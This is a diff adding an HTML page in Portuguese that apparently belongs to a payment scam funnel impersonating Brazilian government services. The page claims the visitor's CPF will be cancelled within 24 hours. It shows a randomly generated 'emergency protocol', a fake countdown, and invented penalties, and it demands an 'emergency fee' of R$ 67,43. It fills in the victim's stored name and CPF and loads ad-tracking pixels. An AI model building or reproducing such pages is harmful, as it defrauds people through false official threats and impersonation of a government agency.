@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <!-- Utmify: captura de UTMs + pixel (ver desen/js/utmify-tracking.js) -->
+  <script src="/desen/js/utmify-tracking.js"></script>
+  <!-- Pixel da Meta nativo + eventos Purchase/IC (ver desen/js/meta-pixel.js) -->
+  <script src="/desen/js/meta-pixel.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <base href="/desen/upsells/4/">
+  <script src="/desen/js/admin-bypass.js"></script>
+  <title>Alerta Cr&iacute;tico - CPF</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap">
+  <style>
+    :root {
+      --pink: #fff;
+      --pink-600: #1351B4;
+      --pink-50: #0f5cd8;
+      --ink: #0f172a;
+      --muted: #6b7280;
+      --radius: 16px;
+      --red: #ef4444;
+      --red-dark: #dc2626;
+    }
+
+    *, ::before, ::after { box-sizing: border-box; margin: 0; padding: 0 }
+    html { height: 100% }
+    body {
+      min-height: 100%;
+      display: flex; flex-direction: column;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", sans-serif;
+      color: #111827;
+      background:
+        radial-gradient(ellipse 900px 500px at 65% -5%, rgba(236,9,120,.07) 0, transparent 70%),
+        radial-gradient(ellipse 600px 400px at 15% 20%, rgba(236,9,120,.04) 0, transparent 70%),
+        #f9fafb;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* ===== Topbar ===== */
+    .topbar {
+      position: sticky; top: 0; z-index: 50;
+      background: var(--pink);
+      border-bottom: 1px solid rgba(0,0,0,.1);
+    }
+    .nav {
+      max-width: 900px; margin: 0 auto; padding: 12px 20px;
+      display: flex; align-items: center; justify-content: space-between;
+    }
+    .brand img { height: 40px; width: auto; display: block; }
+    .avatar { display: flex; align-items: center; gap: 8px }
+    .badge-avatar {
+      height: 36px; width: 36px; display: grid; place-items: center;
+      border-radius: 999px; background: #1351B4; color: white;
+    }
+    .user-info { text-align: right; line-height: 1.3 }
+    .user-name { color: #fff; font-weight: 600; font-size: .85rem; white-space: nowrap }
+    .user-cpf { color: rgba(255,255,255,.7); font-size: .75rem; letter-spacing: .03em }
+
+    /* ===== Main ===== */
+    .hero { flex: 1; padding: 24px 16px 40px }
+    .shell { max-width: 480px; margin: 0 auto; display: grid; gap: 16px }
+
+    /* ===== Card ===== */
+    .card {
+      background: #fff;
+      border: 1px solid rgba(0,0,0,.06);
+      border-radius: var(--radius);
+      box-shadow: 0 1px 3px rgba(0,0,0,.04), 0 8px 32px rgba(236,9,120,.06);
+      overflow: hidden;
+    }
+    .card-head {
+      padding: 14px 20px;
+      display: flex; align-items: center; gap: 10px;
+      border-bottom: 1px solid rgba(0,0,0,.05);
+      background: linear-gradient(180deg, #fff 0%, #fffafd 100%);
+    }
+    .card-title { font-weight: 700; color: #111827; font-size: .95rem }
+    .card-body { padding: 20px }
+
+    /* ===== Animations ===== */
+    .fade-up {
+      opacity: 0; transform: translateY(20px);
+      animation: fadeUp .6s ease forwards;
+    }
+    .fade-up:nth-child(2) { animation-delay: .1s }
+    .fade-up:nth-child(3) { animation-delay: .2s }
+    .fade-up:nth-child(4) { animation-delay: .3s }
+    .fade-up:nth-child(5) { animation-delay: .4s }
+    .fade-up:nth-child(6) { animation-delay: .5s }
+    .fade-up:nth-child(7) { animation-delay: .6s }
+    .fade-up:nth-child(8) { animation-delay: .7s }
+    .fade-up:nth-child(9) { animation-delay: .8s }
+    @keyframes fadeUp {
+      to { opacity: 1; transform: translateY(0) }
+    }
+
+    /* ===== Última etapa badge ===== */
+    .etapa-badge {
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+      background: linear-gradient(135deg, #fef2f2, #fff5f5);
+      border: 1px solid #fca5a5;
+      border-radius: 10px;
+      padding: 10px 16px;
+      font-size: .8rem; font-weight: 700;
+      color: var(--red-dark);
+      text-transform: uppercase;
+      letter-spacing: .05em;
+      position: relative;
+      overflow: hidden;
+    }
+    .etapa-badge::after {
+      content: "";
+      position: absolute; top: 0; left: -100%;
+      width: 60%; height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,.5), transparent);
+      animation: shimmer 3s infinite;
+    }
+    @keyframes shimmer {
+      0% { left: -100% }
+      100% { left: 200% }
+    }
+
+    /* ===== Alert banner ===== */
+    .alert-banner {
+      background: linear-gradient(135deg, var(--red), var(--red-dark));
+      border-radius: var(--radius);
+      padding: 22px 20px;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 4px 20px rgba(239,68,68,.2);
+    }
+    .alert-banner::before {
+      content: "";
+      position: absolute; inset: 0;
+      background: repeating-linear-gradient(
+        -45deg,
+        transparent,
+        transparent 10px,
+        rgba(255,255,255,.03) 10px,
+        rgba(255,255,255,.03) 20px
+      );
+    }
+    .alert-banner-inner { position: relative; z-index: 1; color: #fff }
+    .alert-banner-label {
+      font-size: .7rem; font-weight: 600;
+      text-transform: uppercase; letter-spacing: .12em;
+      opacity: .85; margin-bottom: 8px;
+    }
+    .alert-banner-title {
+      font-size: 1.15rem; font-weight: 900;
+      text-transform: uppercase; letter-spacing: .02em;
+    }
+
+    /* ===== Status dot ===== */
+    .status-dot-red {
+      height: 10px; width: 10px; border-radius: 999px;
+      background: var(--red); flex-shrink: 0;
+      position: relative;
+    }
+    .status-dot-red::after {
+      content: ""; position: absolute; inset: -3px;
+      border-radius: 999px; background: var(--red); opacity: .4;
+      animation: dot-pulse 2s ease-in-out infinite;
+    }
+    @keyframes dot-pulse {
+      0%,100% { transform: scale(1); opacity: .4 }
+      50% { transform: scale(1.6); opacity: 0 }
+    }
+
+    /* ===== Timer ===== */
+    .timer-card {
+      background: #fff;
+      border: 2px solid #fca5a5;
+      border-radius: var(--radius);
+      padding: 20px;
+      text-align: center;
+      box-shadow: 0 4px 20px rgba(239,68,68,.08);
+      position: relative;
+      overflow: hidden;
+    }
+    .timer-card::before {
+      content: "";
+      position: absolute; inset: 0;
+      background:
+        radial-gradient(circle at 20% 50%, rgba(239,68,68,.04) 0, transparent 50%),
+        radial-gradient(circle at 80% 50%, rgba(239,68,68,.04) 0, transparent 50%);
+    }
+    .timer-label {
+      font-size: .8rem; font-weight: 600; color: #991b1b;
+      margin-bottom: 8px; position: relative;
+    }
+    .timer-value {
+      font-size: 2.2rem; font-weight: 900;
+      font-family: 'Courier New', monospace;
+      color: var(--red);
+      font-variant-numeric: tabular-nums;
+      position: relative;
+      animation: timer-pulse 1.5s infinite;
+    }
+    @keyframes timer-pulse {
+      0%,100% { opacity: 1 }
+      50% { opacity: .7 }
+    }
+
+    /* ===== Info text ===== */
+    .info-text {
+      font-size: .85rem; color: #374151; line-height: 1.7;
+    }
+    .info-text + .info-text { margin-top: 12px }
+    .info-text strong { color: var(--ink) }
+
+    /* ===== Issues (amarelo) ===== */
+    .issues-box {
+      background: linear-gradient(135deg, #fffbeb, #fefce8);
+      border: 1px solid #fbbf24;
+      border-left: 4px solid #f59e0b;
+      border-radius: 12px;
+      padding: 16px;
+      position: relative;
+      overflow: hidden;
+    }
+    .issues-box::after {
+      content: "";
+      position: absolute; top: -20px; right: -20px;
+      width: 80px; height: 80px;
+      background: radial-gradient(circle, rgba(245,158,11,.08), transparent 70%);
+      border-radius: 999px;
+    }
+    .issues-title {
+      font-size: .85rem; font-weight: 700; color: #78350f;
+      margin-bottom: 10px;
+    }
+    .issues-box ul { margin: 0 0 0 18px; list-style: disc; position: relative }
+    .issues-box li {
+      font-size: .82rem; color: #92400e;
+      margin-bottom: 5px; line-height: 1.5;
+    }
+
+    /* ===== Protocolo ===== */
+    .protocolo-doc {
+      border: 1.5px solid #cbd5e1;
+      border-radius: 6px;
+      overflow: hidden;
+      font-family: 'Courier New', monospace;
+      font-size: .78rem;
+      position: relative;
+    }
+    .protocolo-doc::before {
+      content: "";
+      position: absolute; top: 0; left: 0;
+      width: 4px; height: 100%;
+      background: linear-gradient(180deg, var(--red), var(--red-dark));
+    }
+    .protocolo-header {
+      background: linear-gradient(135deg, #1e293b, #0f172a);
+      color: #fff;
+      padding: 10px 16px 10px 20px;
+      font-size: .68rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: .1em;
+      display: flex; align-items: center; justify-content: space-between;
+    }
+    .protocolo-header-badge {
+      background: rgba(239,68,68,.2);
+      border: 1px solid rgba(239,68,68,.4);
+      border-radius: 4px;
+      padding: 2px 8px;
+      font-size: .6rem;
+      color: #fca5a5;
+      animation: status-blink 2s infinite;
+    }
+    @keyframes status-blink {
+      0%,70% { opacity: 1 }
+      71%,100% { opacity: .5 }
+    }
+    .protocolo-body {
+      background:
+        repeating-linear-gradient(0deg, transparent, transparent 23px, rgba(0,0,0,.02) 23px, rgba(0,0,0,.02) 24px),
+        linear-gradient(135deg, #f8fafc, #fff);
+      padding: 14px 16px 14px 20px;
+    }
+    .protocolo-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 5px 0;
+      border-bottom: 1px dashed #e2e8f0;
+      color: #475569;
+      line-height: 1.6;
+    }
+    .protocolo-row:last-child { border-bottom: none }
+    .protocolo-label { font-size: .68rem; color: #94a3b8; text-transform: uppercase; letter-spacing: .04em }
+    .protocolo-value { font-weight: 700; color: var(--ink); text-align: right }
+    .protocolo-value.danger { color: var(--red); font-weight: 800 }
+    .protocolo-stamp {
+      margin-top: 10px; padding-top: 10px;
+      border-top: 1.5px solid #e2e8f0;
+      display: flex; align-items: center; justify-content: center; gap: 6px;
+      font-size: .65rem; color: #94a3b8;
+      text-transform: uppercase; letter-spacing: .06em;
+    }
+    .protocolo-stamp-dot {
+      width: 6px; height: 6px; border-radius: 999px;
+      background: var(--red);
+      animation: stamp-blink 1s infinite;
+    }
+    @keyframes stamp-blink {
+      0%,50% { opacity: 1 }
+      51%,100% { opacity: .3 }
+    }
+
+    /* ===== Price ===== */
+    .price-card {
+      background: #fff;
+      border: 2px solid #a7f3d0;
+      border-radius: var(--radius);
+      padding: 24px 20px;
+      text-align: center;
+      box-shadow: 0 4px 20px rgba(34,197,94,.08);
+      position: relative;
+      overflow: hidden;
+    }
+    .price-card::before {
+      content: "";
+      position: absolute; inset: 0;
+      background:
+        radial-gradient(circle at 30% 30%, rgba(34,197,94,.04) 0, transparent 50%),
+        radial-gradient(circle at 70% 70%, rgba(34,197,94,.04) 0, transparent 50%);
+    }
+    .price-label {
+      font-size: .9rem; font-weight: 700; color: #1351B4;
+      margin-bottom: 4px; position: relative;
+    }
+    .price-value {
+      font-size: 2.5rem; font-weight: 900; color: #1351B4;
+      position: relative;
+      margin: 6px 0;
+    }
+    .price-sub {
+      font-size: .75rem; color: var(--muted); position: relative;
+    }
+    .price-desc {
+      font-size: .85rem; color: #374151; line-height: 1.7;
+      text-align: center; margin-bottom: 18px;
+    }
+    .price-desc strong { color: var(--ink) }
+
+    /* ===== Consequences ===== */
+    .conseq-box {
+      background: linear-gradient(135deg, #fef2f2, #fff5f5);
+      border: 1px solid #fca5a5;
+      border-left: 4px solid var(--red);
+      border-radius: 12px;
+      padding: 16px;
+    }
+    .conseq-title {
+      font-size: .85rem; font-weight: 700; color: #991b1b;
+      margin-bottom: 10px;
+    }
+    .conseq-box ul { margin: 0 0 0 18px; list-style: disc }
+    .conseq-box li {
+      font-size: .82rem; color: #7f1d1d;
+      margin-bottom: 5px; line-height: 1.5;
+    }
+    .conseq-box li strong { color: #991b1b }
+
+    /* ===== Button ===== */
+    .btn-cta {
+      display: block; width: 100%;
+      padding: 16px; border: none; border-radius: 12px;
+      font-weight: 800; font-size: 1rem;
+      cursor: pointer; text-align: center;
+      color: #fff;
+      text-transform: uppercase;
+      letter-spacing: .04em;
+      background: linear-gradient(135deg, #1351B4, #1351B4);
+      box-shadow: 0 4px 16px rgba(5, 73, 150, 0.3);
+      transition: transform .15s, box-shadow .2s;
+      animation: btn-pulse 2.5s infinite;
+      position: relative;
+      overflow: hidden;
+    }
+    .btn-cta::after {
+      content: "";
+      position: absolute;
+      top: 0; left: -100%;
+      width: 60%; height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,.15), transparent);
+      animation: btn-shine 2.5s infinite;
+    }
+    @keyframes btn-shine {
+      0% { left: -100% }
+      100% { left: 200% }
+    }
+    .btn-cta:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 24px rgba(5,150,105,.35);
+    }
+    .btn-cta:active { transform: scale(.98) }
+    @keyframes btn-pulse {
+      0%,100% { transform: scale(1) }
+      50% { transform: scale(1.02) }
+    }
+    .btn-sub {
+      text-align: center;
+      font-size: .72rem; color: var(--muted);
+      margin-top: 10px;
+    }
+
+    /* ===== Footer ===== */
+    footer {
+      background: #1e2433;
+      color: #94a3b8;
+      font-size: .8rem;
+    }
+    .foot {
+      max-width: 1200px; margin: 0 auto; padding: 14px 20px;
+      display: flex; align-items: center; justify-content: center; gap: 10px; flex-wrap: wrap;
+    }
+    .foot-logo { height: 20px; width: auto; opacity: .7 }
+    .foot-sep { opacity: .4 }
+    .foot a { color: #cbd5e1; text-decoration: none; transition: color .2s }
+    .foot a:hover { color: #fff }
+
+    @media (max-width: 520px) {
+      .hero { padding: 16px 10px 32px }
+      .card-body { padding: 16px }
+      .timer-value { font-size: 1.8rem }
+      .price-value { font-size: 2rem }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ===== TOPBAR ===== -->
+  <header class="topbar">
+    <div class="nav">
+      <div class="brand">
+        <img src="../../images/iconegovng" alt="Logo" onerror="this.style.display='none'">
+      </div>
+      <div class="avatar">
+        <div class="user-info">
+          <div class="user-name" id="user-display-name"></div>
+          <div class="user-cpf" id="user-display-cpf"></div>
+        </div>
+        <div class="badge-avatar">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+            <circle cx="12" cy="8.5" r="3.2" fill="#ffffff"/>
+            <path d="M4.5 19.5c0-3.2 3.4-5.2 7.5-5.2s7.5 2 7.5 5.2v.3H4.5v-.3z" fill="#ffffff"/>
+          </svg>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- ===== MAIN ===== -->
+  <main class="hero">
+    <div class="shell">
+
+      <!-- Última etapa -->
+      <div class="etapa-badge fade-up">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+        &Uacute;ltima etapa para regulariza&ccedil;&atilde;o
+      </div>
+
+      <!-- Alert banner -->
+      <div class="alert-banner fade-up">
+        <div class="alert-banner-inner">
+          <div class="alert-banner-label">Alerta cr&iacute;tico &mdash; A&ccedil;&atilde;o imediata necess&aacute;ria</div>
+          <div class="alert-banner-title">Seu CPF ser&aacute; cancelado em 24 horas</div>
+        </div>
+      </div>
+
+      <!-- Timer -->
+      <div class="timer-card fade-up">
+        <div class="timer-label">Tempo restante para evitar cancelamento</div>
+        <div class="timer-value" id="countdown">00:09:24</div>
+      </div>
+
+      <!-- Descrição -->
+      <div class="card fade-up">
+        <div class="card-head">
+          <span class="status-dot-red"></span>
+          <div class="card-title">Irregularidade Grave Detectada</div>
+        </div>
+        <div class="card-body">
+          <p class="info-text">Durante o processo de regulariza&ccedil;&atilde;o, nosso sistema detectou uma <strong>irregularidade grave</strong> que pode resultar no <strong>cancelamento definitivo</strong> do seu CPF.</p>
+        </div>
+      </div>
+
+      <!-- Situação crítica -->
+      <div class="card fade-up">
+        <div class="card-body" style="padding:16px">
+          <div class="issues-box">
+            <div class="issues-title">Situa&ccedil;&atilde;o cr&iacute;tica identificada</div>
+            <ul>
+              <li>M&uacute;ltiplas tentativas de regulariza&ccedil;&atilde;o n&atilde;o autorizadas</li>
+              <li>Inconsist&ecirc;ncia nos dados cadastrais detectada</li>
+              <li>Suspeita de uso indevido do documento</li>
+              <li>Falha na valida&ccedil;&atilde;o cruzada com Receita Federal</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <!-- Protocolo -->
+      <div class="protocolo-doc fade-up">
+        <div class="protocolo-header">
+          <span>Protocolo de Emerg&ecirc;ncia</span>
+          <span class="protocolo-header-badge">Urgente</span>
+        </div>
+        <div class="protocolo-body">
+          <div class="protocolo-row">
+            <span class="protocolo-label">N&ordm; Protocolo</span>
+            <span class="protocolo-value">#CPF-CANCEL-2026-<span id="protocolNumber"></span></span>
+          </div>
+          <div class="protocolo-row">
+            <span class="protocolo-label">Tipo</span>
+            <span class="protocolo-value">Cancelamento de CPF</span>
+          </div>
+          <div class="protocolo-row">
+            <span class="protocolo-label">Prioridade</span>
+            <span class="protocolo-value danger">CR&Iacute;TICA</span>
+          </div>
+          <div class="protocolo-row">
+            <span class="protocolo-label">Data</span>
+            <span class="protocolo-value" id="protocolo-data"></span>
+          </div>
+          <div class="protocolo-row">
+            <span class="protocolo-label">Status</span>
+            <span class="protocolo-value danger">CANCELAMENTO IMINENTE</span>
+          </div>
+          <div class="protocolo-stamp">
+            <span class="protocolo-stamp-dot"></span>
+            Documento gerado automaticamente pelo sistema
+          </div>
+        </div>
+      </div>
+
+      <!-- Preço + Botão -->
+      <div class="card fade-up">
+        <div class="card-body">
+          <p class="price-desc">Para <strong>evitar o cancelamento definitivo</strong>, &eacute; obrigat&oacute;rio o pagamento imediato da Taxa de Preserva&ccedil;&atilde;o Cadastral.</p>
+          <div class="price-card">
+            <div class="price-label">Taxa de Emerg&ecirc;ncia</div>
+            <div class="price-value">R$ 67,43</div>
+            <div class="price-sub">Valor &uacute;nico para evitar cancelamento</div>
+          </div>
+          <button class="btn-cta" id="btn-pagar" style="margin-top:18px">PAGAR TAXA DE EMERG&Ecirc;NCIA</button>
+          <div class="btn-sub">O pagamento ser&aacute; confirmado imediatamente ap&oacute;s processamento</div>
+        </div>
+      </div>
+
+      <!-- Consequências -->
+      <div class="card fade-up">
+        <div class="card-body" style="padding:16px">
+          <div class="conseq-box">
+            <div class="conseq-title">Se n&atilde;o pagar agora:</div>
+            <ul>
+              <li>CPF ser&aacute; <strong>cancelado permanentemente</strong></li>
+              <li>Imposs&iacute;vel abrir conta banc&aacute;ria</li>
+              <li>Bloqueio total para empr&eacute;stimos e financiamentos</li>
+              <li>Nome permanece negativado <strong>para sempre</strong></li>
+              <li>Multa de at&eacute; <strong>R$ 5.000</strong> por uso de CPF cancelado</li>
+              <li>Impedimento para emitir documentos (RG, Passaporte)</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </main>
+
+  <!-- ===== FOOTER ===== -->
+  <footer>
+    <div class="foot">
+      <img src="../../images/iconegovng" alt="Logo" class="foot-logo">
+      <span>&copy; <span id="y"></span> Central</span>
+      <span class="foot-sep">&middot;</span>
+      <a href="#">Privacidade</a>
+      <span class="foot-sep">&middot;</span>
+      <a href="#">Termos</a>
+    </div>
+  </footer>
+
+  <!-- ===== SCRIPTS ===== -->
+  <script>
+    document.getElementById('y').textContent = new Date().getFullYear();
+
+    (function() {
+      var nome = localStorage.getItem('userName') || '';
+      var cpf = localStorage.getItem('userCPF') || '';
+      if (nome) {
+        var p = nome.trim().split(/\s+/);
+        document.getElementById('user-display-name').textContent = p.length > 1 ? p[0] + ' ' + p[p.length-1] : p[0];
+      }
+      if (cpf) {
+        var l = cpf.replace(/\D/g, '');
+        document.getElementById('user-display-cpf').textContent = l.slice(0,3) + '.\u2022\u2022\u2022.\u2022\u2022\u2022-' + l.slice(-2);
+      }
+    })();
+
+    (function() {
+      var n = Math.floor(Math.random() * 900000) + 100000;
+      var l = String.fromCharCode(65 + Math.floor(Math.random() * 26)) +
+              String.fromCharCode(65 + Math.floor(Math.random() * 26));
+      document.getElementById('protocolNumber').textContent = n + l;
+      document.getElementById('protocolo-data').textContent = new Date().toLocaleDateString('pt-BR') + ' ' + new Date().toLocaleTimeString('pt-BR', {hour:'2-digit', minute:'2-digit'});
+    })();
+
+    (function() {
+      var minutes = 9, seconds = 24;
+      var el = document.getElementById('countdown');
+      setInterval(function() {
+        seconds--;
+        if (seconds < 0) { seconds = 59; minutes--; }
+        if (minutes < 0) { minutes = 0; seconds = 0; }
+        el.textContent = '00:' + minutes.toString().padStart(2,'0') + ':' + seconds.toString().padStart(2,'0');
+      }, 1000);
+    })();
+
+    document.getElementById('btn-pagar').addEventListener('click', function() {
+      var params = new URLSearchParams(window.location.search);
+      // Preço e nome vêm do catálogo do servidor (api/produtos.php).
+      window.location.href = '/desen/upsell4/?' + params.toString();
+    });
+  </script>
+
+</body>
+</html>
